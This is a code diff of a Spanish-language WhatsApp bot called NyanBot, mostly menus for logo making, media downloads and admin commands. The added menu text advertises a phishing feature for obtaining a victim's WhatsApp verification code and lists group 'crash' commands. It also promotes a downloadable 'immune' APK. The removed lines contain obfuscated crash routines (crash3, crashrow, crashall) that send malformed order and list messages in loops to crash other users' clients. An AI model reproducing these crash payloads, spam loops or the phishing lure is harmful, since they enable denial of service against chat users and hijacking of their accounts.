+samu330.sendMessage(from, Menuo, MessageType.text, {
 quoted: floc})
 addFilter(from)
 addLevelingLevel(sender, 5)		
@@ -2356,16 +2189,190 @@ case 'menu7':
 samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return reply(mess.only.usrReg)
 uptime = process.uptime()
-samu330.sendMessage(from, `${Menu7}`, MessageType.text, {
+const Menu7 = {
+text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
+
+Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:
+
+paypal.me/samu330
+
+
+
+${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
+${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
+${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
+${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
+${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
+${bodyM} ${prefix}ger *(Etiqueta una imagen)*
+${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
+${bodyM} ${prefix}cg *(Etiqueta una imagen)*
+
+*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
+	     🌸 SamịPerry.li 🌸
+ ******************************
+`,
+contextInfo: {
+mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+}
+}
+samu330.sendMessage(from, Menu7, MessageType.text, {
 quoted: fvid})
 addFilter(from)
 addLevelingLevel(sender, 5)		
 break
-
 case 'menu8':
 samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return reply(mess.only.usrReg)
-samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
+const Menu8 = {
+text: `*COMANDOS PARA ${botNumber}*
+
+*Pará actualizar el bot:*
+_${prefix}actualizar_
+
+*Para apagar el bot:*
+_${prefix}apagar_
+
+
+⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 
+
+*${prefix}Restaurar*
+
+Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
+funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.
+
+╭─────────────
+│ *${prefix}ban*
+│ _Prohibe el uso del bot a una persona_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}unban*
+│ _Permite el uso del bot a una persona baneada_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}banchat*
+│ _Bloquea el uso del bot en los chats que se active_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}bloquear*
+│ _Bloquea usuarios_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desbloquear*
+│ _Desbloquea usuarios_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}setname*
+│ _Cambia tu nombre de usuario_
+│
+│ *${prefix}setpic*
+│ _Actualiza tu foto de perfil_
+│
+│ *${prefix}setstatus*
+│ _Cambia tu estado de WhatsApp_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estado*
+│ _Envia un estado de texto_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estadopic*
+│ _Envia una imagen a tu estado_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estadovid*
+│ _Envia un video a tu estado_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}vaciar*
+│ _Vacia el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}vaciartodo*
+│ _Elimina todos los chats_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}bc*
+│ _Broadcast_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}spam*
+│ _Spam de mensajes_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}fijar*
+│ _Fijar el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desfijar*
+│ _Desfija el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}archivar*
+│ _Archiva un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desarchivar*
+│ _Desarchiva todo_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}silencio*
+│ _Mutea un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desilenciar*
+│ _Desmutea un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}sinleer*
+│ _Muestra Chats sin leer_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}apagar*
+│ _Apaga el bot_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}marcarsinleer*
+│ _Marca como no leido todos los chats_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}leertodo*
+│ _Lee todos los chats_
+╰──────────────────────`,
+contextInfo: {
+mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+}
+}
+samu330.sendMessage(from, Menu8, MessageType.text, {
 quoted: ftoko})
 addFilter(from)
 addLevelingLevel(sender, 5)		
@@ -2375,6 +2382,29 @@ case 'menu9':
 if (!isRegister) return reply(mess.only.usrReg)
 reply('*Gathering information...*')
 smww = fs.readFileSync(`./media/SmWW.png`)
+menu9 = `*${pushname}*
+
+_Estos comandos solo pueden ser utilizados en grupos, y solo los puede uzar ${botNumber}_
+
+🔥 ${prefix}crash
+🔥 ${prefix}crash2
+🔥 ${prefix}crash3
+🔥 ${prefix}crashloc
+🔥 ${prefix}crashcom
+🔥 ${prefix}crashpc
+
+💠Si quieres ser inmune a estos comandos, Samu a creado un WhatsApp que soporta estos bugs, si quieres probar este WhatsApp comunicate con el:
+
+*wa.me/+529984907794*
+
+O bien puedes descargar desde el enlace...
+
+https://www.mediafire.com/file/3srfb3tledxwg87/Inmune_Crash_Bot%25E2%259C%258F%25EF%25B8%258F.apk/file
+
+Si quieres tener este bot, y usar tu los comandos, ve como se instala aqui:
+
+_https://www.youtube.com/watch?v=rOPBe6O-k3M_`
+
 samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
 	fromMe: false, 
 	participant: `0@s.whatsapp.net`, ...(from ? {
@@ -2426,29 +2456,23 @@ _enlinea_
 _Adminlist_`
 reply(nuevo)
 break
-
-
-
-case 'sider':
-if (!isGroup) return reply(mess.only.group)
-infom = await samu330.messageInfo(from, sam.message.extendedTextMessage.contextInfo.stanzaId)
-tagg = []
-teks = `✅ Este Mensaje ah sido visto por:\n\n`
-for(let i of infom.reads){
-teks += '@' + i.jid.split('@')[0] + '\n'
-teks += `📲 Hora: ` + moment(`${i.t}` * 1000).tz('America/Mexico_City').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
-tagg.push(i.jid)
-}
-mentions(teks, tagg, true)
-break
-
-case 'audiodur':
-encmediam = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-mediam = await samu330.downloadAndSaveMediaMessage(encmediam)
-cokmatane = Number(args[0])
-hah = fs.readFileSync(mediam)
-samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:faud})
-fs.unlinkSync(mediam)
+case 'sino':
+SendButKev(from, 'kevin ok', "MACHU", fs.readFileSync('./src/help.jpg'), [
+          {
+            buttonId: `${prefix}test 1`,
+            buttonText: {
+              displayText: `TEST 1`,
+            },
+            type: 1,
+          },
+          {
+            buttonId: `${prefix}TEST 2`,
+            buttonText: {
+              displayText: `TEST 2`,
+            },
+            type: 1,
+          },
+        ]);
 break
 
 //audios 
@@ -2684,7 +2708,7 @@ samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt:
 break
 case 'audios':
 addFilter(from)
-reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *☠️ Team SkullForce 500 ☠️* `)
+reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *By Samu330* 💠`)
 break
 		
 case 'top5':
@@ -2802,103 +2826,7 @@ break
 		
 case 'crash3':
 const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!itsMe)return reply('*A......??*');function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;samu330[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':fs.readFileSync('./src/ara.png'),'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':'*👑Samu330 Crashing Groups!!🔥','orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));samu330[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(sam[_0x181205(0x87)]['remoteJid']);
-break	
-
-case 'crashcatal':
-    samu330.toggleDisappearingMessages(from, 0)
-    samu330.toggleDisappearingMessages(from, 0)
-    samu330.toggleDisappearingMessages(from, 0)
-res131 = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": `${samuBug}`, "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/fake.jpg'), "surface": 'CATALOG' }}, {quoted:sam})
-samu330.relayWAMessage(res131)
-samu330.toggleDisappearingMessages(from, 0)
-samu330.toggleDisappearingMessages(from, 0)
-samu330.toggleDisappearingMessages(from, 0)
-break
-
-case 'crashrow':
-var _0x6d39=["\x6F\x77\x6E\x65\x72\x42","\x6F\x6E\x6C\x79","\x74\x6F\x67\x67\x6C\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x73","\u270D\uD83C\uDFFB\x53\x61\x6D\x75\x33\x33\x30","","\x43\x6C\x69\x63\x6B\x20\x41\x71\x75\x69\x21\x21","\x53\x49\x4E\x47\x4C\x45\x5F\x53\x45\x4C\x45\x43\x54","\x5B\x20","\x20\x5D","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];if(!isOwner){return reply(mess[_0x6d39[1]][_0x6d39[0]])};samu330[_0x6d39[2]](from,0);let bug2=samu330[_0x6d39[9]](from,{"\x6C\x69\x73\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":_0x6d39[3],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x62\x75\x74\x74\x6F\x6E\x54\x65\x78\x74":_0x6d39[5],"\x6C\x69\x73\x74\x54\x79\x70\x65":_0x6d39[6],"\x73\x65\x63\x74\x69\x6F\x6E\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[7]}${pushname}${_0x6d39[8]}`,"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x72\x6F\x77\x49\x64":`${_0x6d39[4]}`}]}]}},{quoted:ftoko});samu330[_0x6d39[10]](bug2);samu330[_0x6d39[2]](from,0)
-break   
-
-
-case 'crashall':
-if (!isOwner) return reply(mess.only.ownerB)
-if (args.length < 1) return reply('y el numero de veses a enviar?')
-try {
-var hets = `🔥 *NyanBot* 💣`
-var grousp = await samu330.groupMetadata(from)
-var membere = grousp['participants']
-var mems = []
-membere.map(async adm => {
-mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-text: hets,
-contextInfo: { mentionedJid: mem },
-quoted: sam
-}
-for (let i = 0; i < args[0]; i++) {
-var _$_3890=["text","5219984907794@s.whatsapp.net","5219984907794","INQUIRY","CATALOG","sendMessage"];samu330[_$_3890[5]](from,options,MessageType[_$_3890[0]],{quoted:{key:{fromMe:false,participant:`0@s.whatsapp.net`,...(from?{remoteJid:_$_3890[1]}:{})},"message":{"orderMessage":{"orderId":_$_3890[2],"itemCount":-20030418,"status":_$_3890[3],"surface":_$_3890[4],"orderTitle":`${pushname}`,"sellerJid":_$_3890[1]}}}})
-}
-} catch {
-for(let i=0;i<10;i++){
-var _$_27e9=["\ud83d\udca3Crash *Samu330* NyanBot All\ud83d\udde1","text","5219984907794@s.whatsapp.net","5219984907794","INQUIRY","CATALOG","sendMessage"];samu330[_$_27e9[6]](from,_$_27e9[0],MessageType[_$_27e9[1]],{quoted:{key:{fromMe:false,participant:`0@s.whatsapp.net`,...(from?{remoteJid:_$_27e9[2]}:{})},"message":{"orderMessage":{"orderId":_$_27e9[3],"itemCount":-20030418,"status":_$_27e9[4],"surface":_$_27e9[5],"message":`🔥Samu330🪀`,"orderTitle":`${pushname}`,"sellerJid":_$_27e9[2]}}}})
-}
-}
-break
-
-case 'baileys':
-reply(`${sam.quoted.isBaileys}`)
-break    
-
-case 'unavista':
-resview = await samu330.prepareMessageFromContent(from,{
-"viewOnceMessage": {
-"message": {
-"imageMessage": {
-"mimetype": 'image/jpeg',
-"jpegThumbnail": fs.readFileSync('./media/reply.png'),
-"viewOnce": true
-}
-}
-}
-}, {}) 
-samu330.relayWAMessage(resview)
-break
-
-case 'demoteall':
-if (!isOwner) return reply(mess.only.ownerB)
-if (!isGroup) return reply(mess.only.group)
-if (!botAdmin) return reply(mess.only.Badmin)
-members_id = []
-for (let mem of groupMembers) {
-members_id.push(mem.jid)
-}
-samu330.groupDemoteAdmin(from, members_id)
-break
-case 'promoteall':
-if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
-if (!isGroup) return reply(mess.only.group)
-if (!botAdmin) return reply(mess.only.Badmin)
-members_id = []
-for (let mem of groupMembers) {
-members_id.push(mem.jid)
-}
-samu330.groupMakeAdmin(from, members_id)
-break
-
-case 'test9':
-grup12 = samu330.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '573152139466-1616220327@g.us', "inviteCode": 'https://chat.whatsapp.com/BGTQNDzESmEJr2cCJlccWV', "groupName": `🍒Grupo Oficial de NyanBot💎`, "footerText": "*_© Samu330_*", "jpegThumbnail": fs.readFileSync('./src/ara.png'), "caption": q, "inviteCode": "yv4xLt3+eglcsUG7", "inviteExpiration": "1631410397"}}, {quoted:sam})
-samu330.relayWAMessage(grup12)
-break
-
-case 'bt':
-    res13 = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": 'blablabla', "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/ara.png'), "surface": 'CATALOG' }}, {quoted:sam})
-    samu330.relayWAMessage(res13)
-break
-
-case 'bt2':
-    sendButLocation(from, `hola`, `tests`, {jpegThumbnail: fs.readFileSync('./src/fake.jpg')}, [{buttonId:`${prefix}status`,buttonText:{displayText:'1'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'2'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'3'},type:1}], {contextInfo: { mentionedJid: [sender]}})
-break
+break		
 	
 //Evaluar ecuaciones By Samu330
 /**/case 'calc':
@@ -3190,17 +3118,6 @@ const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
 var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
 var imageBuffer = new Buffer.from(mantap, 'base64');
 samu330.sendMessage(from, imageBuffer, sticker, {quoted: sam})
-addFilter(from)
-break
-
-case 'sp':
-mentioneds = sam.message.extendedTextMessage.contextInfo.mentionedJid
-picM = samu330.getProfilePicture(mentioneds)
-reply(mess.wait)
-const bas64sp = `data:image/jpeg;base64,${picM.toString('base64')}`
-var imageBuffersp = new Buffer.from(mantapsp, 'base64');
-var mantapsp = await convertSticker(bas64sp, `✍🏻Sp By Samu330🍒\n🔥Sam y Perry🍂`, `${pushname}\n🌬NyanBot💎`)
-samu330.sendMessage(from, imageBuffersp, sticker, {quoted: sam})
 addFilter(from)
 break
 		
@@ -3976,20 +3893,20 @@ if (args.length < 1) return reply('Y el link?')
 if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
 teks = args.join(' ')
 reply('*Espere un momento...*')
-resyt = await y2mateA(teks).catch(e => {
+res = await y2mateA(teks).catch(e => {
 reply('_[ ! ] Error del servidor_')
 })
 result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
-*°Titulo :* ${resyt[0].judul}
-*°Tamaño :* ${resyt[0].size}
-*°Calidad :* ${resyt[0].quality}kbps
-*°Nombre del archivo :* ${resyt[0].output}
-*°Salida :* ${resyt[0].tipe}
+*°Titulo :* ${res[0].judul}
+*°Tamaño :* ${res[0].size}
+*°Calidad :* ${res[0].quality}kbps
+*°Nombre del archivo :* ${res[0].output}
+*°Salida :* ${res[0].tipe}
 _*El archivo se esta enviando.....*_
 `
-sendFileFromUrl(resyt[0].thumb, image, {caption: result, quoted: sam})
-sendFileFromUrl(resyt[0].link, audio, {quoted: faud, duration :-99999999, mimetype: 'audio/mp3'})
-sendFileFromUrl(resyt[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999})
+sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam})
+sendFileFromUrl(res[0].link, audio, {quoted: faud, duration :-99999999, mimetype: 'audio/mp3'})
+sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999})
 addFilter(from)
 addLevelingLevel(sender, 5)		
 break
@@ -3999,19 +3916,19 @@ if (args.length < 1) return reply('Y el link?')
 if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
 teks = args.join(' ')
 reply(mess.wait)
-resyv = await y2mateV(teks).catch(e => {
+res = await y2mateV(teks).catch(e => {
 reply('_[ ! ] Error del servidor_')
 })
 result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
-*°Titulo :* ${resyv[0].judul}
-*°Tamaño :* ${resyv[0].size}
-*°Calidad :* ${resyv[0].quality}p
-*°Nombre :* ${resyv[0].output}
-*°Output :* ${resyv[0].tipe}
+*°Titulo :* ${res[0].judul}
+*°Tamaño :* ${res[0].size}
+*°Calidad :* ${res[0].quality}p
+*°Nombre :* ${res[0].output}
+*°Output :* ${res[0].tipe}
 _*El archivo se esta enviando.....*_
 `
-sendFileFromUrl(resyv[0].thumb, image, {caption: result, quoted: sam})
-sendFileFromUrl(resyv[0].link, video, {quoted: fvid, mimetype:'video/mp4', duration: 9999999999})
+sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam})
+sendFileFromUrl(res[0].link, video, {quoted: fvid, mimetype: Mimetype.gif, duration: 9999999999})
 addFilter(from)
 addLevelingLevel(sender, 5)		
 break
@@ -4391,8 +4308,6 @@ reply(`No hay sesión en curso.`);
 }
 break
 
-
-
 case 'wa.me':
 case 'wame':
 samu330.updatePresence(from, Presence.composing)
@@ -4431,8 +4346,8 @@ const serialUser = createSerial(20)
 const momento = require('moment-timezone')
 const time = momento.tz('America/Mexico_City').format('HH:mm:ss')
 if(isNaN(edad)) return await reply('*La edad es un numero🙄*!!')
-if (nombre.length >= 10) return reply(`*Tu nombre es acaso un tren?*\nUn nombre no puede tener mas de *10* letras`)
